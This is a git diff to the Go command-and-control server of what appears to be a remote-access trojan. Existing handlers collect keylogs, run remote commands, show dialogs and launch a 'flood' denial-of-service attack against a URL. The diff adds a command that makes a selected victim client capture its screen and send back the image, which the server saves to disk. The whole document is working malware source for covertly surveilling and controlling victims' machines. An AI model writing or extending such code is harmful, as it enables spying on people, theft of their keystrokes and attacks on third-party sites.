@@ -58,7 +58,7 @@ var client_execoutput map[string]string = make(map[string]string)
 var client_dialog map[string]string = make(map[string]string)
 var client_dialogoutput map[string]string = make(map[string]string)
 
-// var keylog_file map[string]
+var should_screenshot bool = false
 
 var banner string = `
 ▄▄▄       ██ ▄█▀ ██▓ ██▓    ▄▄▄█████▓
@@ -220,6 +220,40 @@ func (s *server) SetDialogOutput(ctx context.Context, in *pb.DialogOutput) (*pb.
 	return &pb.Void{}, nil
 }
 
+func (s *server) GetScreen(ctx context.Context, in *pb.ClientDataRequest) (*pb.ScreenData, error) {
+	if !Contains(client_ids, in.ClientId) {
+		client_ids = append(client_ids, in.ClientId)
+	}
+
+	if in.ClientId == current_id {
+		ss := should_screenshot
+		should_screenshot = false
+		return &pb.ScreenData{ShouldTakeScreenshot: ss}, nil
+	}
+	return &pb.ScreenData{ShouldTakeScreenshot: false}, nil
+}
+
+func (s *server) SetScreenOutput(ctx context.Context, in *pb.ScreenOutput) (*pb.Void, error) {
+	if !Contains(client_ids, in.Id.ClientId) {
+		client_ids = append(client_ids, in.Id.ClientId)
+	}
+
+	if in.Id.ClientId == current_id {
+		var file *os.File
+
+		defer file.Close()
+
+		file, err := os.OpenFile(fmt.Sprintf("screenshot-%s.jpeg", in.Id.ClientId), os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			return &pb.Void{}, err
+		}
+
+		file.Write(in.ImageData)
+	}
+
+	return &pb.Void{}, nil
+}
+
 func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.Void, error) {
 	if !Contains(client_ids, in.Id.ClientId) {
 		client_ids = append(client_ids, in.Id.ClientId)
@@ -282,9 +316,8 @@ func initialModel() model {
 		"select", "exit",
 		"exec", "list_clients",
 		"cleartext", "flood",
-		"dialog"}
+		"dialog", "screenshot"}
 	ti.CandidateViewMode = textinput.CandidateViewHorizental
-
 	s := spinner.New()
 	s.Spinner = spinner.Dot
 
@@ -392,6 +425,12 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 				return m, nil
 			}
 
+			if len(m.textInput.Value()) == 10 && m.textInput.Value() == "screenshot" {
+				should_screenshot = true
+				m.showok = true
+				return m, nil
+			}
+
 			if len(m.textInput.Value()) >= 5 && m.textInput.Value()[:5] == "flood" {
 				split_str := strings.Fields(m.textInput.Value())
 				if len(split_str) <= 4 {
@@ -423,6 +462,8 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 
 				flood_params = &floodParamas{url: split_str[1], limit: limit, num_threads: threads, Type: floodType}
 				m.showfloodoutput = true
+
+				return m, nil
 			}
 
 			if len(m.textInput.Value()) >= 6 && m.textInput.Value()[:6] == "dialog" {
